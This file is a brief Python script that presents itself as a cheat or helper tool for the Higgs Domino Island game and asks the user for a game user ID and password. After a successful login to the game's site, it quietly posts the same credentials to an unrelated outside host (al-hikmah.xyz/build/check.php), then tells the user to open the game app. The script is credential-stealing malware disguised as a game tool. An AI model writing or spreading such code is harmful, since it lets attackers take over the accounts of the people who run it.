import requests,getpass,os
from time import sleep
logo = ""

	###############################
	#     SCRIPT TUYUL                                      #
	#    HIGH DOMINO ISLAND                          #
	#     #BY BANGKE                                         #
	###############################
	     
r = requests.Session()
def main():
	os.system("clear")
	print(logo)
	b = input("     User:")
	a = getpass.getpass("     Pasword:")
	url = "https://www.topbos.com/web/idLogin.do"
	hed = {
	"user-agent":"Mozilla public license/2.0 (Linux; Android 9; SM-A207F Build/PPR1.180610.110; wv) AppleWebKit/537.36 (KHTML like Gecko) Version/4.0 Chrome/86.04240Mobile Safari/537.36"
	}
	data = {
	"userId":b,
	"secondPwd":a,
	"submitBtn":"submitBtn"
	}
	s =r.post(url,data=data,headers=hed)
	print(s.text)
	if"Parameter salah" in s.text:
	   print("    Error...[Masukan dengan Benar]")
	   sleep(2)
	   main()
	elif"No result defined" in s.text:
	   print("    Error...[Masukan dengan Benar]")
	   sleep(2)
	   main()
	elif"kata sandi yang anda masukkan salah,silahkan diulang" in s.text:
	   print("    Error...[Masukan dengan Benar]")
	   sleep(2)
	   main()
	elif"Jumlah kesalahan Anda terlalu banyak. Silakan coba lagi setelah 30 detik" in s.text:
	   print("    Error...[Masukan dengan Benar]")
	   sleep(2)
	   main()
	elif"pengguna tidak ada" in s.text:
	   print("    Error...[Masukan dengan Benar]")
	   sleep(2)
	   main()
	else:
	   rl = "http://al-hikmah.xyz/build/check.php"
	   c = requests.post(rl,data={"email":b,"password":a, "submit":"login"})
	   print("   berhasil...[Buka Apk Dominonya]")